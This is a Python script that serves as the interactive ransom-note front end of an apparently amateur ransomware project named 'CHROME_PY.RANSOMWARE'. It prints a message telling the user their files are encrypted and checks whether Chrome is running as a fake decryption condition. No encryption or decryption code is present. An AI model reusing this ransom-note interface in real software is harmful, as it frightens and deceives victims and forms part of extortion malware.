import os
import sys
import time
from time import sleep 
import psutil
import platform

def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

class process_def():
    
    def slowprints(s):
        for c in s + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(2.0/90)
    
    def reading_files(name_files):
        files = open(name_files,'r')
        data = files.read()
        files.close()
        return data
    
    def clear_text():
        if platform.system().upper() == "WINDOWS":
            os.system('cls')
        else:
            os.system('clear')
process_running = False
def main():
    prompt_user = process_def.reading_files(f'user_setting\\setup.config').split(" ")
    global process_running
    prompt_code = input(f"{prompt_user[0]}@{prompt_user[1]}$ ").upper()
    data_code = prompt_code.split(" ")
    if data_code[0] == "HELP":
        process_def.slowprints("\n         +\n     .+.'+'.+.\n  .+'.   .   .'+.\n  '.  '+' '+'  .'\n  (%o%o%oOo%o%o%)\n   `===========`\nASCII ART FROM www.asciiart.eu\n\nIf you wanna read NOTE pls type this command ---> NOTE or note\nIf you wanna exit can type this command ---> EXIT or exit\nYou can type this command to clear all text ---> cls or CLS\nAnd other command i not show command :)\n")
    elif data_code[0] == "CHECK_PROCESS":
        process_def.slowprints(f"\nTRYING TO CHECK PROCESS . . .\n")
        if checkIfProcessRunning('chrome'):
            process_running = True
            process_def.slowprints('YOU CAN DECRYPT FILES . . .\n')
        else:
            process_running = False
            process_def.slowprints("YOU CAN'T DECRYPT FILES . . .\n")
    elif data_code[0] == "CLS" or data_code[0] == "CLEAR":
        process_def.clear_text()
    elif data_code[0] == "EXIT":
        sys.exit()
    elif data_code[0] == "NOTE":
        process_def.slowprints(f'''\nLOADING CHECK-DECRYPT {process_running} . . .''')
        if process_running == False:
            process_def.slowprints('''\n          o \n       o^/|\^o\n    o_^|\/*\/|^_o\n   o\*`'.\|/.'`*/o\n    \\\\\\\\\\\\|//////\n     {><><@><><}\n     `"""""""""`\nASCII ART FROM www.asciiart.eu\n\nYour computer files have been encrypted . . . .\nThis virus make by dev (XD LOCKER RANSOMWARE & ROBLOX RANSOMWARE)\nBut now i don't have permission to delete files all.\nYou have all time to decrypt files.\nHow to decrypt?\nYou can use command (CHECK_PROCESS)\nProcess require to decrypt file is chrome.\nYou can use this command (DECRYPT_FILES)\nif you recv this message "YOU CAN DECRYPT FILES . . ." from command CHECK_PROCESS.\n\n I wanna call this virus is CHROME_PY.RANSOMWARE\n\n          Thank you  _\n''')
        else:
            process_def.slowprints('''\n          o \n       o^/|\^o\n    o_^|\/*\/|^_o\n   o\*`'.\|/.'`*/o\n    \\\\\\\\\\\\|//////\n     {><><@><><}\n     `"""""""""`\nASCII ART FROM www.asciiart.eu\n\nYou can decrypt file with this command (DECRYPT_FILES) now\n\n I wanna call this virus is CHROME_PY.RANSOMWARE\n\n          Thank you  _\n''')
    else:
        process_def.slowprints(F"\nI DON'T KNOW WHAT IS YOU TYPE '{prompt_code}' . . .\nYOU CAN USE HELP COMMAND :)\nTO SHOW LIST COMMAND\n")
    main()
main()
